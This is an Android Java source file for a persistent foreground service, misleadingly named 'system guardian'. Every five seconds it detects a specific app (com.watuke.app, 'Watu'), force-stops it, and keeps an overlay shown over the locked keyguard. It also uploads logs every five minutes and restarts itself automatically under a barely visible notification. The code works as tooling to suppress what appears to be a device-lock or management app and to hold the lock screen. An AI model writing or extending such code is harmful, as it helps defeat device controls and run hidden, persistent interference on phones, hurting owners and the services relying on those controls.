package com.system.guardian;

import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.system.guardian.background.LogUploadWorker;
import com.system.guardian.util.AppUtils;
import com.system.guardian.util.OverlayUtils;
import com.system.guardian.util.WatchdogLogger;

public class WatchdogForegroundService extends Service {

    private static final String CHANNEL_ID = "guardian_watchdog";
    private static final String TARGET_PKG = "com.watuke.app";

    private Handler handler;
    private long lastUpload = 0;
    private boolean started = false;

    private final Runnable watchdogLoop = new Runnable() {
        @Override
        public void run() {
            try {
                executeWatchdogCycle();
            } catch (Exception e) {
                WatchdogLogger.logError(getApplicationContext(), "[WATCHDOG] ❌ Loop error: " + e.getMessage());
            }
            handler.postDelayed(this, 5000);
        }
    };

    private void executeWatchdogCycle() {
        Context context = getApplicationContext();

        WatchdogLogger.log(context, "[WATCHDOG] 🌀 Watchdog cycle triggered");

        if (AppUtils.isAppRunning(context, TARGET_PKG)) {
            WatchdogLogger.log(context, "[WATCHDOG] ⚠️ Watu running — suppressing again");
            OverlayUtils.ensureOverlayVisible(context);
            AppUtils.forceStopApp(context, TARGET_PKG);
        } else {
            WatchdogLogger.log(context, "[WATCHDOG] ✅ Watu not detected — ensuring overlay stays active");
        }

        KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        if (km != null && km.isKeyguardLocked()) {
            boolean isSecure = km.isKeyguardSecure();
            WatchdogLogger.log(context, "[WATCHDOG] 🔒 Keyguard detected (secure=" + isSecure + ") — re-enabling overlay");
            OverlayUtils.ensureOverlayVisible(context);
        }

        OverlayUtils.ensureOverlayVisible(context); // catch any other overlay loss

        long now = System.currentTimeMillis();
        if (now - lastUpload > 5 * 60 * 1000) {
            lastUpload = now;
            WatchdogLogger.log(context, "[WATCHDOG] 📡 Uploading logs via WorkManager (5-min interval)");
            androidx.work.OneTimeWorkRequest logWork =
                    new androidx.work.OneTimeWorkRequest.Builder(LogUploadWorker.class)
                            .addTag("WatchdogLogUpload").build();
            androidx.work.WorkManager.getInstance(context).enqueue(logWork);
        }
    }

    @SuppressLint("ForegroundServiceType")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!started) {
            HandlerThread thread = new HandlerThread("WatchdogThread");
            thread.start();
            handler = new Handler(thread.getLooper());

            int pid = android.os.Process.myPid();
            long tid = Thread.currentThread().getId();
            WatchdogLogger.log(this, "[WATCHDOG] 🚀 Starting service (PID=" + pid + ", ThreadID=" + tid + ")");

            startForeground(1, buildNotification());
            handler.postDelayed(watchdogLoop, 1000);
            WatchdogLogger.log(this, "[WATCHDOG] 🧠 Loop scheduled and running");
            CrashLogger.flush(this);
            started = true;
        }
        return START_STICKY;
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel chan = new NotificationChannel(CHANNEL_ID, "Guardian Watchdog", NotificationManager.IMPORTANCE_MIN);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(chan);
        }

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Guardian Watchdog Active")
                .setContentText("Monitoring Watu and system lock events...")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        if (handler != null) handler.removeCallbacks(watchdogLoop);
        super.onDestroy();
        WatchdogLogger.log(this, "[WATCHDOG] 🧯 Foreground watchdog stopped");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
